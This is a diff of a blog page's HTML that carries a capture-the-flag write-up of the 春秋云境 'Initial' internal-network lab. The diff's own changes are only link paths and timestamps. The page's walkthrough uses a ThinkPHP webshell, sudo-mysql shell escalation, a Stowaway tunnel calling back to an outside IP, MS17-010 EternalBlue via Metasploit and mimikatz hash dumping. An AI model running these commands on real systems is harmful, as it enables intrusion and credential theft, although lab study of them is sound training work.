@@ -20,12 +20,12 @@
   <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
   <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
 
-  <meta name="description" content="靶机介绍Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。 flag01访问题目环境是个登陆框，这是 ThinkPHP 框架，用工具扫 nday![](&#x2F;images&#x2F;Pasted%20image%20fd0f597f41b28d6d94dace9bab34534b 1.png)这里也是存">
+  <meta name="description" content="靶机介绍Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。 flag01访问题目环境是个登陆框，这是 ThinkPHP 框架，用工具扫 nday![](images&#x2F;Pasted%20image%20fd0f597f41b28d6d94dace9bab34534b 1.png)这里也是存在两个漏洞，">
 <meta property="og:type" content="article">
 <meta property="og:title" content="春秋云境——Initial">
 <meta property="og:url" content="http://example.com/2025/06/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%E2%80%94%E2%80%94Initial/index.html">
 <meta property="og:site_name" content="Licivo&#39;s Blog">
-<meta property="og:description" content="靶机介绍Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。 flag01访问题目环境是个登陆框，这是 ThinkPHP 框架，用工具扫 nday![](&#x2F;images&#x2F;Pasted%20image%20fd0f597f41b28d6d94dace9bab34534b 1.png)这里也是存">
+<meta property="og:description" content="靶机介绍Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。 flag01访问题目环境是个登陆框，这是 ThinkPHP 框架，用工具扫 nday![](images&#x2F;Pasted%20image%20fd0f597f41b28d6d94dace9bab34534b 1.png)这里也是存在两个漏洞，">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/images/Pasted%20image%2019d6c3528e54c9759d6f7093aab05323.png">
 <meta property="og:image" content="http://example.com/images/Pasted%20image%201af8405f9785ed1f794146b6c066e445.png">
@@ -45,7 +45,7 @@
 <meta property="og:image" content="http://example.com/images/Pasted%20image%2041d4312e483df7d4c1bbf1b0d6bf2a60.png">
 <meta property="og:image" content="http://example.com/images/Pasted%20image%202e03bba4d8a9516028ccd9d9efcb1715.png">
 <meta property="article:published_time" content="2025-06-09T05:11:53.500Z">
-<meta property="article:modified_time" content="2025-12-26T08:30:58.838Z">
+<meta property="article:modified_time" content="2025-12-26T08:42:05.357Z">
 <meta property="article:author" content="Licivo">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/Pasted%20image%2019d6c3528e54c9759d6f7093aab05323.png">
@@ -212,13 +212,13 @@ document.addEventListener('keydown', function(e) {
                 <div class="category-count">3</div>
             </a>
         
-            <a class="category-link" href="/categories/LLM%E5%AE%89%E5%85%A8/">
-                LLM安全
+            <a class="category-link" href="/categories/CTF/">
+                CTF
                 <div class="category-count">1</div>
             </a>
         
-            <a class="category-link" href="/categories/CTF/">
-                CTF
+            <a class="category-link" href="/categories/LLM%E5%AE%89%E5%85%A8/">
+                LLM安全
                 <div class="category-count">1</div>
             </a>
         </div>
@@ -287,7 +287,7 @@ document.addEventListener('keydown', function(e) {
       <div class="e-content article-entry" itemprop="articleBody">
         
           <h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。</p>
-<h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p><img src="/images/Pasted%20image%2019d6c3528e54c9759d6f7093aab05323.png"><br>访问题目环境是个登陆框，这是 <code>ThinkPHP</code> 框架，用工具扫 nday<br>![](&#x2F;images&#x2F;Pasted%20image%20fd0f597f41b28d6d94dace9bab34534b 1.png)<br>这里也是存在两个漏洞，写入  <code>webshell</code><br><img src="/images/Pasted%20image%201af8405f9785ed1f794146b6c066e445.png"><br>连接 webshell<br><img src="/images/Pasted%20image%20da284f374721775824fc9f29d38f36d8.png"><br>查看当前的内核<img src="/images/Pasted%20image%208c3d6072b8026c986f462b4bfad92f3a.png"><br>用 <code>sudo -l</code> 查看是否有能够提权的机会，查询到 mysql 数据库无密码验证，可以直接利用<br><img src="/images/Pasted%20image%20e5a70ca866520800cf511ffc633754b7.png"><br><img src="/images/Pasted%20image%20408b0e3577b22ed76db55e619fbd41f2.png"><br><code>sudo mysql -e &#39;\! /bin/sh&#39;</code>  <strong>通过 MySQL 客户端执行本地 shell 的技巧</strong><br>但是输入后发现没什么变化，修改命令直接寻找 flag</p>
+<h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p><img src="/images/Pasted%20image%2019d6c3528e54c9759d6f7093aab05323.png"><br>访问题目环境是个登陆框，这是 <code>ThinkPHP</code> 框架，用工具扫 nday<br>![](images&#x2F;Pasted%20image%20fd0f597f41b28d6d94dace9bab34534b 1.png)<br>这里也是存在两个漏洞，写入  <code>webshell</code><br><img src="/images/Pasted%20image%201af8405f9785ed1f794146b6c066e445.png"><br>连接 webshell<br><img src="/images/Pasted%20image%20da284f374721775824fc9f29d38f36d8.png"><br>查看当前的内核<img src="/images/Pasted%20image%208c3d6072b8026c986f462b4bfad92f3a.png"><br>用 <code>sudo -l</code> 查看是否有能够提权的机会，查询到 mysql 数据库无密码验证，可以直接利用<br><img src="/images/Pasted%20image%20e5a70ca866520800cf511ffc633754b7.png"><br><img src="/images/Pasted%20image%20408b0e3577b22ed76db55e619fbd41f2.png"><br><code>sudo mysql -e &#39;\! /bin/sh&#39;</code>  <strong>通过 MySQL 客户端执行本地 shell 的技巧</strong><br>但是输入后发现没什么变化，修改命令直接寻找 flag</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! find / -name fl*&#x27;</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>find 的基本语法为 <code>find &lt;起始路径&gt; &lt;匹配条件&gt;</code><br>所以 <code>/</code> 的含义是从当前目录下开始寻找<br>获取 <code>flag01</code> <code>flag01: flag{60b53231-</code><br><img src="/images/Pasted%20image%209a9dd7989868fededaa3189ec8e02177.png"></li>
@@ -296,18 +296,18 @@ document.addEventListener('keydown', function(e) {
 <h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>先查看当前的 ip <code>172.22.1.15</code><br>将 <code>fscan</code> 文件上传授予权限后进行扫描</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.1.15/24 &gt; 1.txt</span><br></pre></td></tr></table></figure>
 <p>扫描结果如下<br><img src="/images/Pasted%20image%202b5d533608d5e6880e7134bbcbce7591.png"><br>从中主要获取到以下信息<br>[+] NetBios 172.22.1.21 DC:DC01.xiaorang.lab<br>[+] WebTitle <a target="_blank" rel="noopener" href="http://172.22.1.18/?m=login">http://172.22.1.18?m=login</a> code:200 len:4012   title:信呼协同办公系统<br>[+] MS17-010 172.22.1.21    (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</p>
-<h3 id="工具代理"><a href="#工具代理" class="headerlink" title="工具代理"></a>工具代理</h3><p>这里使用到的工具为 <a href="/images/Pasted%20image%20Stowaway"></a></p>
+<h3 id="工具代理"><a href="#工具代理" class="headerlink" title="工具代理"></a>工具代理</h3><p>这里使用到的工具为 <a href="images/Pasted%20image%20Stowaway"></a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 8000 -s 123</span><br></pre></td></tr></table></figure>
 <ul>
 <li>监听端口8000，并对通信进行加密秘钥为123。等待被控端的连接<br>将agent 文件通过蚁剑上传授予权限后执行命令</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_agent -c 115.120.234.208:8000 -s 123 --reconnect 8</span><br></pre></td></tr></table></figure>
 <ul>
-<li>使用秘钥123连接控制端8000端口，并设置重连间隔时间，当控制端掉线时客户端每隔8s重连控制端<br>![](&#x2F;images&#x2F;Pasted%20image%20ce44f6dd0bbe84e55a53bb59e3d1c4a0 1.png)<br>接下来在服务器端设置socks5代理端口为7777，连接账号密码为 admin admin</li>
+<li>使用秘钥123连接控制端8000端口，并设置重连间隔时间，当控制端掉线时客户端每隔8s重连控制端<br>![](images&#x2F;Pasted%20image%20ce44f6dd0bbe84e55a53bb59e3d1c4a0 1.png)<br>接下来在服务器端设置socks5代理端口为7777，连接账号密码为 admin admin</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks 7777 admin admin</span><br></pre></td></tr></table></figure>
 <p><img src="/images/Pasted%20image%207f9071f463b30b2adb3f624bedcd72fc.png"><br>在本地使用 <code>proxifier</code> 软件进行配置<br><img src="/images/Pasted%20image%201998bfed2b05569346f4d841d83774c8.png"></p>
-<h3 id="信呼-OA"><a href="#信呼-OA" class="headerlink" title="信呼 OA"></a>信呼 OA</h3><p>代理完成后访问内网网址 <code>172.22.1.18/？m=login</code><br><img src="/images/Pasted%20image%204bbb8c634db3cda17b094484db349eff.png"><br>登录页面存在弱口令 <code>admin:admin123</code> 登录成功，登录成功后可以查找到当前的版本存在 RCE漏洞，在网上寻找到 EXP 在服务器上便可以直接打 [](&#x2F;images&#x2F;Pasted%20image%20信呼OA RCE)<br><img src="/images/Pasted%20image%20b5660ecec51bd34e5624e4c8724246f9.png"><br>文件上传成功后给蚁剑设置代理后连接<br><img src="/images/Pasted%20image%200a44ae100f698c742853d4139e629266.png"><br><img src="/images/Pasted%20image%20dc7059f73bc62c28a9ae4738e1a510cd.png"><br>在根目录查找到 flag02<br><img src="/images/Pasted%20image%202f0085bacd9d9843915d0b8d0ec62263.png"></p>
+<h3 id="信呼-OA"><a href="#信呼-OA" class="headerlink" title="信呼 OA"></a>信呼 OA</h3><p>代理完成后访问内网网址 <code>172.22.1.18/？m=login</code><br><img src="/images/Pasted%20image%204bbb8c634db3cda17b094484db349eff.png"><br>登录页面存在弱口令 <code>admin:admin123</code> 登录成功，登录成功后可以查找到当前的版本存在 RCE漏洞，在网上寻找到 EXP 在服务器上便可以直接打 [](images&#x2F;Pasted%20image%20信呼OA RCE)<br><img src="/images/Pasted%20image%20b5660ecec51bd34e5624e4c8724246f9.png"><br>文件上传成功后给蚁剑设置代理后连接<br><img src="/images/Pasted%20image%200a44ae100f698c742853d4139e629266.png"><br><img src="/images/Pasted%20image%20dc7059f73bc62c28a9ae4738e1a510cd.png"><br>在根目录查找到 flag02<br><img src="/images/Pasted%20image%202f0085bacd9d9843915d0b8d0ec62263.png"></p>
 <h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><h3 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h3><p>接下来的目标便是域控主机，该主机存在 ms17-010 漏洞，所以直接用 kali 去 打</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 <p>成功后拿到<code>SYSTEM</code> 权限，接下来通过 <code>load kiwi</code> 调用 <code>mimikatz</code> 模块抓取域内用户的 hash</p>
